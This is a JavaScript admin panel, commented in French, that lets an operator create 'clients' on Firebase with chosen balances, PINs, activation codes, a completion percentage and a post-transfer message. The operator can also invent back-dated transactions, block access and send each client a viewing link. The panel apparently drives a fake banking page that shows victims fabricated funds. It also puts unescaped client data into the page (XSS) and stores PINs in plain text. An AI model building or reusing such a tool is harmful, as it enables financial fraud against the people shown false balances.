// ============================================================
// APP PAY ADMIN - Gestion des clients (Firebase)
// ============================================================

import {
    db,
    authPromise,
    collection,
    doc,
    setDoc,
    getDoc,
    getDocs,
    updateDoc,
    deleteDoc,
    query,
    where,
    serverTimestamp
} from './firebase-config.js';

const COLLECTION_NAME = 'clients';
let lastGeneratedLink = '';
let selectedColor = '#ff7a00';
let selectedModifyColor = '#ff7a00';
let allClients = [];
let selectedClientId = null;
let pendingTransactions = [];

// ---------- UTILITAIRES ----------
function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = 'toast ' + type;
    const icons = {
        success: 'fa-circle-check',
        error: 'fa-circle-xmark',
        info: 'fa-circle-info'
    };
    toast.style.cssText = `
        position: fixed; top: 20px; right: 20px; background: #111; color: white;
        padding: 14px 20px; border-radius: 6px; font-size: 13px; z-index: 99999;
        box-shadow: 0 8px 24px rgba(0,0,0,0.2); display: flex; align-items: center;
        gap: 10px; animation: fadeIn 0.3s ease; max-width: 380px;
    `;
    const iconColor = type === 'error' ? '#e02424' : (type === 'success' ? '#00c853' : '#ff7a00');
    toast.innerHTML = `<i class="fa-solid ${icons[type] || icons.info}" style="color:${iconColor}"></i> <span>${message}</span>`;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateId() {
    return 'ap' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function formatDate() {
    const now = new Date();
    return now.toLocaleDateString('fr-FR') + ' • ' +
        now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
}

// ============================================================
// SÉLECTEUR DE COULEUR (création)
// ============================================================
function initColorPicker() {
    const picker = document.getElementById('color-picker');
    const hiddenInput = document.getElementById('c-color');

    picker.querySelectorAll('.color-option').forEach(option => {
        option.addEventListener('click', () => {
            picker.querySelectorAll('.color-option').forEach(o => o.classList.remove('selected'));
            option.classList.add('selected');
            selectedColor = option.dataset.color;
            hiddenInput.value = selectedColor;
        });
    });

    const defaultOption = picker.querySelector('[data-color="#ff7a00"]');
    if (defaultOption) defaultOption.classList.add('selected');
}

// ============================================================
// SÉLECTEUR DE COULEUR (modification)
// ============================================================
function initModifyColorPicker() {
    const picker = document.getElementById('m-color-picker');
    const hiddenInput = document.getElementById('m-color');

    picker.querySelectorAll('.color-option').forEach(option => {
        option.addEventListener('click', () => {
            picker.querySelectorAll('.color-option').forEach(o => o.classList.remove('selected'));
            option.classList.add('selected');
            selectedModifyColor = option.dataset.color;
            hiddenInput.value = selectedModifyColor;
        });
    });
}

// ============================================================
// CRÉATION D'UN CLIENT
// ============================================================
async function handleCreateClient(event) {
    event.preventDefault();

    const lastName = document.getElementById('c-lastname').value.trim();
    const firstName = document.getElementById('c-firstname').value.trim();
    const country = document.getElementById('c-country').value;
    const countryFlag = document.querySelector('#c-country option:checked')?.dataset.flag || '';
    const address = document.getElementById('c-address').value.trim();
    const email = document.getElementById('c-email').value.trim().toLowerCase();
    const phone = document.getElementById('c-phone').value.trim();
    const language = document.getElementById('c-language').value;
    const balance = parseFloat(document.getElementById('c-balance').value) || 0;
    const currency = document.getElementById('c-currency').value;
    const pin = document.getElementById('c-pin').value.trim();
    const activationCode = document.getElementById('c-activation').value.trim();
    const percentValue = parseInt(document.getElementById('c-percent-value').value, 10);
    const messageAfterTransfer = document.getElementById('c-message').value.trim();
    const color = document.getElementById('c-color').value;

    if (!lastName || !firstName) return showToast('Nom et prénom obligatoires.', 'error');
    if (!country) return showToast('Pays obligatoire.', 'error');
    if (!email.includes('@') || !email.includes('.')) return showToast('Adresse e-mail invalide.', 'error');
    if (!language) return showToast('Langue obligatoire.', 'error');
    if (!/^\d{4,8}$/.test(pin)) return showToast('Le code PIN doit contenir 4 à 8 chiffres.', 'error');
    if (activationCode.length < 4) return showToast("Le code d'activation doit contenir au moins 4 caractères.", 'error');
    if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) {
        return showToast('Le pourcentage doit être entre 0 et 100.', 'error');
    }
    if (!messageAfterTransfer) return showToast('Le message après virement est obligatoire.', 'error');
    if (!color) return showToast('Veuillez choisir une couleur.', 'error');

    const submitBtn = document.querySelector('.btn-create');
    const originalHTML = submitBtn.innerHTML;
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Création en cours...';

    try {
        await authPromise;

        const emailCheck = query(collection(db, COLLECTION_NAME), where('email', '==', email));
        const existing = await getDocs(emailCheck);
        if (!existing.empty) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalHTML;
            return showToast('Un client avec cet e-mail existe déjà.', 'error');
        }

        const clientId = generateId();
        const clientData = {
            id: clientId,
            lastName, firstName, country, countryFlag,
            address, email, phone, language,
            balance, currency, pin, activationCode,
            percentValue, messageAfterTransfer, color,
            transactions: [],
            blocked: false,
            createdAt: new Date().toISOString(),
            createdAtServer: serverTimestamp()
        };

        await setDoc(doc(db, COLLECTION_NAME, clientId), clientData);

        const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'index.html');
        const link = `${baseUrl}?id=${clientId}`;

        lastGeneratedLink = link;
        document.getElementById('generated-link').value = link;
        document.getElementById('link-modal').classList.add('show');

        event.target.reset();
        document.getElementById('c-balance').value = '0.00';
        document.getElementById('c-currency').value = 'zł';
        document.getElementById('c-country').value = 'France';
        document.getElementById('c-language').value = 'fr';
        document.getElementById('c-percent-value').value = '100';
        selectedColor = '#ff7a00';
        document.getElementById('c-color').value = '#ff7a00';
        const picker = document.getElementById('color-picker');
        picker.querySelectorAll('.color-option').forEach(o => o.classList.remove('selected'));
        picker.querySelector('[data-color="#ff7a00"]').classList.add('selected');

        await loadClients();
        showToast('Client créé avec succès !', 'success');
    } catch (err) {
        console.error('Erreur création client :', err);
        showToast('Erreur lors de la création : ' + (err.message || 'inconnue'), 'error');
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalHTML;
    }
}

// ============================================================
// CHARGEMENT DES CLIENTS
// ============================================================
async function loadClients() {
    const list = document.getElementById('clients-list');
    const countBadge = document.getElementById('client-count');

    try {
        await authPromise;
        const snapshot = await getDocs(collection(db, COLLECTION_NAME));
        allClients = snapshot.docs.map(d => d.data());
        allClients.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

        countBadge.textContent = allClients.length;

        // Remplir le sélecteur de modification
        populateModifySelect();

        if (allClients.length === 0) {
            list.innerHTML = '<p class="empty-state">Aucun client créé pour le moment.</p>';
            return;
        }

        list.innerHTML = '';
        allClients.forEach(client => {
            const card = document.createElement('div');
            card.className = 'client-card' + (client.blocked ? ' blocked' : '');
            card.innerHTML = `
                <div class="client-info">
                    <div class="client-name">
                        <span class="color-dot" style="background:${client.color || '#ff7a00'};"></span>
                        <span class="flag">${client.countryFlag || '🌍'}</span>
                        ${(client.lastName || '').toUpperCase()} ${client.firstName || ''}
                        ${client.blocked ? '<span class="blocked-badge">BLOQUÉ</span>' : ''}
                    </div>
                    <div class="client-email">${client.email}</div>
                    <div class="client-meta">
                        <span><i class="fa-solid fa-coins"></i> ${Number(client.balance || 0).toFixed(2)} ${client.currency || 'zł'}</span>
                        <span><i class="fa-solid fa-percent"></i> ${client.percentValue || 100}%</span>
                        <span><i class="fa-solid fa-language"></i> ${client.language || 'fr'}</span>
                        <span><i class="fa-regular fa-calendar"></i> ${new Date(client.createdAt).toLocaleDateString('fr-FR')}</span>
                    </div>
                </div>
                <div class="client-actions">
                    <button class="btn-icon" title="Copier le lien" data-action="copy" data-id="${client.id}">
                        <i class="fa-regular fa-copy"></i>
                    </button>
                    <button class="btn-icon" title="Modifier" data-action="edit" data-id="${client.id}">
                        <i class="fa-solid fa-pen"></i>
                    </button>
                    <button class="btn-icon danger" title="Supprimer" data-action="delete" data-id="${client.id}">
                        <i class="fa-regular fa-trash-can"></i>
                    </button>
                </div>
            `;
            list.appendChild(card);
        });

        list.querySelectorAll('[data-action]').forEach(btn => {
            btn.addEventListener('click', () => {
                const action = btn.dataset.action;
                const id = btn.dataset.id;
                if (action === 'copy') copyClientLink(id);
                else if (action === 'edit') selectClientForModify(id);
                else if (action === 'delete') deleteClient(id);
            });
        });

    } catch (err) {
        console.error('Erreur chargement clients :', err);
        list.innerHTML = '<p class="empty-state" style="color:#e02424;">Erreur de chargement : ' + err.message + '</p>';
    }
}

// ============================================================
// SÉLECTEUR DE MODIFICATION
// ============================================================
function populateModifySelect() {
    const select = document.getElementById('m-select-client');
    const current = select.value;
    select.innerHTML = '<option value="">-- Choisir un client --</option>';
    allClients.forEach(c => {
        const opt = document.createElement('option');
        opt.value = c.id;
        opt.textContent = `${(c.lastName || '').toUpperCase()} ${c.firstName || ''} — ${c.email}`;
        select.appendChild(opt);
    });
    if (current) select.value = current;
}

// ============================================================
// SÉLECTIONNER UN CLIENT POUR MODIFICATION
// ============================================================
function selectClientForModify(clientId) {
    const select = document.getElementById('m-select-client');
    select.value = clientId;
    handleModifyClientChange();
    // Scroll vers la section de modification
    document.querySelector('.modify-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function handleModifyClientChange() {
    const clientId = document.getElementById('m-select-client').value;
    const fields = document.getElementById('modify-fields');

    if (!clientId) {
        fields.classList.add('hidden');
        selectedClientId = null;
        return;
    }

    const client = allClients.find(c => c.id === clientId);
    if (!client) return;

    selectedClientId = clientId;
    fields.classList.remove('hidden');

    // Remplir les champs
    document.getElementById('m-lastname').value = client.lastName || '';
    document.getElementById('m-firstname').value = client.firstName || '';
    document.getElementById('m-country').value = client.country || '';
    document.getElementById('m-address').value = client.address || '';
    document.getElementById('m-email').value = client.email || '';
    document.getElementById('m-phone').value = client.phone || '';
    document.getElementById('m-language').value = client.language || 'fr';
    document.getElementById('m-balance').value = client.balance || 0;
    document.getElementById('m-currency').value = client.currency || 'zł';
    document.getElementById('m-pin').value = client.pin || '';
    document.getElementById('m-activation').value = client.activationCode || '';
    document.getElementById('m-percent-value').value = client.percentValue || 100;
    document.getElementById('m-message').value = client.messageAfterTransfer || '';

    // Couleur
    selectedModifyColor = client.color || '#ff7a00';
    document.getElementById('m-color').value = selectedModifyColor;
    const picker = document.getElementById('m-color-picker');
    picker.querySelectorAll('.color-option').forEach(o => {
        o.classList.toggle('selected', o.dataset.color === selectedModifyColor);
    });

    // Devise affichée dans le champ montant
    document.getElementById('m-tx-currency-display').textContent = client.currency || 'zł';

    // Statut d'accès
    updateAccessStatus(client.blocked);

    // Historique des virements
    pendingTransactions = (client.transactions || []).slice();
    renderModifyTransactions();
}

function updateAccessStatus(blocked) {
    const info = document.getElementById('access-status-info');
    if (blocked) {
        info.innerHTML = 'Statut actuel : <strong style="color:#e02424;">Bloqué</strong>';
    } else {
        info.innerHTML = 'Statut actuel : <strong style="color:#03543f;">Actif</strong>';
    }
}

// ============================================================
// HISTORIQUE DES VIREMENTS DANS LA SECTION MODIFIER
// ============================================================
function renderModifyTransactions() {
    const list = document.getElementById('m-tx-list');
    if (!pendingTransactions || pendingTransactions.length === 0) {
        list.innerHTML = '<p class="empty-state">Aucun virement pour le moment.</p>';
        return;
    }

    list.innerHTML = '';
    pendingTransactions.forEach((tx, idx) => {
        const isDebit = tx.amount < 0;
        const item = document.createElement('div');
        item.className = 'm-tx-item ' + (isDebit ? 'debit' : 'credit');
        item.innerHTML = `
            <div class="m-tx-item-info">
                <div class="m-tx-item-title">${tx.title || 'Virement'}</div>
                <div class="m-tx-item-date">${tx.date || ''}</div>
            </div>
            <div class="m-tx-item-amount ${isDebit ? 'debit' : 'credit'}">
                ${isDebit ? '' : '+'}${Number(tx.amount).toFixed(2)}
            </div>
            <button class="m-tx-item-delete" title="Supprimer" data-idx="${idx}">
                <i class="fa-regular fa-trash-can"></i>
            </button>
        `;
        list.appendChild(item);
    });

    list.querySelectorAll('.m-tx-item-delete').forEach(btn => {
        btn.addEventListener('click', () => {
            const idx = parseInt(btn.dataset.idx, 10);
            if (confirm('Supprimer ce virement ?')) {
                pendingTransactions.splice(idx, 1);
                renderModifyTransactions();
            }
        });
    });
}

// ============================================================
// AJOUTER UN VIREMENT AU COMPTE CLIENT
// ============================================================
function handleAddTransaction() {
    if (!selectedClientId) return showToast('Aucun client sélectionné.', 'error');

    const amount = parseFloat(document.getElementById('m-tx-amount').value);
    const type = document.getElementById('m-tx-type').value;
    const label = document.getElementById('m-tx-label').value.trim();
    const dateInput = document.getElementById('m-tx-date').value.trim();

    if (!amount || amount <= 0) return showToast('Montant invalide.', 'error');
    if (!label) return showToast('Libellé obligatoire.', 'error');

    const client = allClients.find(c => c.id === selectedClientId);
    if (!client) return;

    const finalAmount = type === 'credit' ? amount : -amount;
    const dateStr = dateInput || formatDate();

    const tx = {
        type: type,
        title: label,
        date: dateStr,
        amount: finalAmount
    };

    pendingTransactions.unshift(tx);
    renderModifyTransactions();

    // Vider les champs
    document.getElementById('m-tx-amount').value = '';
    document.getElementById('m-tx-label').value = '';
    document.getElementById('m-tx-date').value = '';
    document.getElementById('m-tx-type').value = 'credit';

    showToast('Virement ajouté (en attente d\'enregistrement).', 'success');
}

// ============================================================
// BLOQUER / DÉBLOQUER L'ACCÈS CLIENT
// ============================================================
async function handleBlockAccess() {
    if (!selectedClientId) return showToast('Aucun client sélectionné.', 'error');
    const client = allClients.find(c => c.id === selectedClientId);
    if (!client) return;

    if (client.blocked) {
        return showToast('Ce client est déjà bloqué.', 'info');
    }

    if (!confirm(`Bloquer l'accès de ${client.firstName} ${client.lastName} ?`)) return;

    try {
        await authPromise;
        await updateDoc(doc(db, COLLECTION_NAME, selectedClientId), { blocked: true });
        client.blocked = true;
        updateAccessStatus(true);
        await loadClients();
        showToast('Accès bloqué avec succès.', 'success');
    } catch (err) {
        console.error(err);
        showToast('Erreur lors du blocage.', 'error');
    }
}

async function handleUnblockAccess() {
    if (!selectedClientId) return showToast('Aucun client sélectionné.', 'error');
    const client = allClients.find(c => c.id === selectedClientId);
    if (!client) return;

    if (!client.blocked) {
        return showToast("Ce client n'est pas bloqué.", 'info');
    }

    try {
        await authPromise;
        await updateDoc(doc(db, COLLECTION_NAME, selectedClientId), { blocked: false });
        client.blocked = false;
        updateAccessStatus(false);
        await loadClients();
        showToast('Accès débloqué avec succès.', 'success');
    } catch (err) {
        console.error(err);
        showToast('Erreur lors du déblocage.', 'error');
    }
}

// ============================================================
// SAUVEGARDER LES MODIFICATIONS
// ============================================================
async function handleSaveChanges() {
    if (!selectedClientId) return showToast('Aucun client sélectionné.', 'error');

    const client = allClients.find(c => c.id === selectedClientId);
    if (!client) return;

    // Récupération
    const lastName = document.getElementById('m-lastname').value.trim();
    const firstName = document.getElementById('m-firstname').value.trim();
    const country = document.getElementById('m-country').value;
    const countryFlag = document.querySelector('#m-country option:checked')?.dataset.flag || client.countryFlag || '';
    const address = document.getElementById('m-address').value.trim();
    const email = document.getElementById('m-email').value.trim().toLowerCase();
    const phone = document.getElementById('m-phone').value.trim();
    const language = document.getElementById('m-language').value;
    const balance = parseFloat(document.getElementById('m-balance').value) || 0;
    const currency = document.getElementById('m-currency').value;
    const pin = document.getElementById('m-pin').value.trim();
    const activationCode = document.getElementById('m-activation').value.trim();
    const percentValue = parseInt(document.getElementById('m-percent-value').value, 10);
    const messageAfterTransfer = document.getElementById('m-message').value.trim();
    const color = document.getElementById('m-color').value;

    // Validations
    if (!lastName || !firstName) return showToast('Nom et prénom obligatoires.', 'error');
    if (!country) return showToast('Pays obligatoire.', 'error');
    if (!email.includes('@') || !email.includes('.')) return showToast('Adresse e-mail invalide.', 'error');
    if (!/^\d{4,8}$/.test(pin)) return showToast('Le code PIN doit contenir 4 à 8 chiffres.', 'error');
    if (activationCode.length < 4) return showToast("Le code d'activation doit contenir au moins 4 caractères.", 'error');
    if (isNaN(percentValue) || percentValue < 0 || percentValue > 100) {
        return showToast('Le pourcentage doit être entre 0 et 100.', 'error');
    }
    if (!messageAfterTransfer) return showToast('Le message après virement est obligatoire.', 'error');
    if (!color) return showToast('Veuillez choisir une couleur.', 'error');

    // Vérifier email unique (sauf pour ce client)
    const emailCheck = query(collection(db, COLLECTION_NAME), where('email', '==', email));
    const existing = await getDocs(emailCheck);
    const emailTaken = existing.docs.some(d => d.id !== selectedClientId);
    if (emailTaken) return showToast('Cet e-mail est utilisé par un autre client.', 'error');

    const btn = document.getElementById('btn-save-changes');
    const originalHTML = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Enregistrement...';

    try {
        await authPromise;

        const updatedData = {
            lastName, firstName, country, countryFlag,
            address, email, phone, language,
            balance, currency, pin, activationCode,
            percentValue, messageAfterTransfer, color,
            transactions: pendingTransactions,
            updatedAt: new Date().toISOString()
        };

        await updateDoc(doc(db, COLLECTION_NAME, selectedClientId), updatedData);

        // Mettre à jour la liste locale
        const idx = allClients.findIndex(c => c.id === selectedClientId);
        if (idx !== -1) {
            allClients[idx] = { ...allClients[idx], ...updatedData };
        }

        await loadClients();
        showToast('Modifications enregistrées avec succès !', 'success');
    } catch (err) {
        console.error('Erreur sauvegarde :', err);
        showToast('Erreur lors de l\'enregistrement.', 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = originalHTML;
    }
}

// ============================================================
// ACTIONS SUR UN CLIENT (liste)
// ============================================================
function getClientLink(clientId) {
    const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'index.html');
    return `${baseUrl}?id=${clientId}`;
}

function copyClientLink(id) {
    const link = getClientLink(id);
    if (navigator.clipboard) {
        navigator.clipboard.writeText(link).then(() => {
            showToast('Lien copié dans le presse-papiers !', 'success');
        }).catch(() => {
            prompt('Copiez ce lien manuellement :', link);
        });
    } else {
        prompt('Copiez ce lien manuellement :', link);
    }
}

async function deleteClient(id) {
    const client = allClients.find(c => c.id === id);
    if (!client) return;
    if (!confirm(`Supprimer définitivement ${client.firstName} ${client.lastName} ?`)) return;

    try {
        await authPromise;
        await deleteDoc(doc(db, COLLECTION_NAME, id));
        if (selectedClientId === id) {
            selectedClientId = null;
            document.getElementById('modify-fields').classList.add('hidden');
            document.getElementById('m-select-client').value = '';
        }
        await loadClients();
        showToast('Client supprimé.', 'info');
    } catch (err) {
        console.error('Erreur suppression :', err);
        showToast('Erreur lors de la suppression.', 'error');
    }
}

async function clearAllClients() {
    if (allClients.length === 0) return;
    if (!confirm('Supprimer TOUS les clients ? Cette action est irréversible.')) return;

    try {
        await authPromise;
        for (const client of allClients) {
            await deleteDoc(doc(db, COLLECTION_NAME, client.id));
        }
        await loadClients();
        showToast('Tous les clients ont été supprimés.', 'info');
    } catch (err) {
        console.error('Erreur suppression totale :', err);
        showToast('Erreur lors de la suppression totale.', 'error');
    }
}

// ============================================================
// MODAL
// ============================================================
function closeModal() {
    document.getElementById('link-modal').classList.remove('show');
}

function copyGeneratedLink() {
    const input = document.getElementById('generated-link');
    input.select();
    const value = input.value;

    const doCopy = () => {
        const btn = document.getElementById('copy-btn');
        const original = btn.innerHTML;
        btn.innerHTML = '<i class="fa-solid fa-check"></i> Copié !';
        btn.style.backgroundColor = '#00c853';
        setTimeout(() => {
            btn.innerHTML = original;
            btn.style.backgroundColor = '';
        }, 2000);
        showToast('Lien copié !', 'success');
    };

    if (navigator.clipboard) {
        navigator.clipboard.writeText(value).then(doCopy).catch(() => {
            prompt('Copiez ce lien :', value);
        });
    } else {
        prompt('Copiez ce lien :', value);
    }
}

function openGeneratedLink() {
    if (lastGeneratedLink) window.open(lastGeneratedLink, '_blank');
}

// ============================================================
// EXPOSITION GLOBALE
// ============================================================
window.clearAllClients = clearAllClients;
window.closeModal = closeModal;
window.copyGeneratedLink = copyGeneratedLink;
window.openGeneratedLink = openGeneratedLink;

// ============================================================
// INITIALISATION
// ============================================================
document.addEventListener('DOMContentLoaded', async () => {
    document.getElementById('create-client-form').addEventListener('submit', handleCreateClient);
    document.getElementById('link-modal').addEventListener('click', (e) => {
        if (e.target.id === 'link-modal') closeModal();
    });

    // Section modification
    document.getElementById('m-select-client').addEventListener('change', handleModifyClientChange);
    document.getElementById('btn-block-access').addEventListener('click', handleBlockAccess);
    document.getElementById('btn-unblock-access').addEventListener('click', handleUnblockAccess);
    document.getElementById('btn-add-transaction').addEventListener('click', handleAddTransaction);
    document.getElementById('btn-save-changes').addEventListener('click', handleSaveChanges);

    initColorPicker();
    initModifyColorPicker();
    await loadClients();
});
